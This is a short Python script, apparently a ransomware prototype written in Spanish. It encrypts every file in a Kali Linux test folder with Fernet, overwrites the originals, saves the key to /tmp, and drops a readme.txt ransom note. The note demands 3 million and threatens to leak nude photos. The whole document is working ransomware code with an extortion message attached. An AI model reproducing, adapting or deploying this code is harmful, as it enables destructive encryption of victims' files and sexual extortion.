from cryptography.fernet import Fernet
import os

def generate_and_save_key():
    key = Fernet.generate_key()
    with open('/tmp/encryption_key.key', 'wb') as key_file:
        key_file.write(key)
    print(f"Clave generada y guardada: {key}")
    return key

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        try:
            with open(item, 'rb') as file:
                file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            with open(item, 'wb') as file:
                file.write(encrypted_data)
            print(f"Archivo encriptado: {item}")
        except Exception as e:
            print(f"Error al encriptar {item}: {str(e)}")

if __name__ == '__main__':
    path_to_encrypt = '/home/kali/Desktop/prueba/'
    items = os.listdir(path_to_encrypt)
    full_path = [os.path.join(path_to_encrypt, item) for item in items if os.path.isfile(os.path.join(path_to_encrypt, item))]

    key = generate_and_save_key()
    encrypt(full_path, key)
    print("Proceso de encriptacitación completado.")

    with open(os.path.join(path_to_encrypt, 'readme.txt'), 'w') as file:
        file.write('Ficheros encriptados correctamente \n')
        file.write('Paga los 3 millones o si no tus fotitos en pelota eran')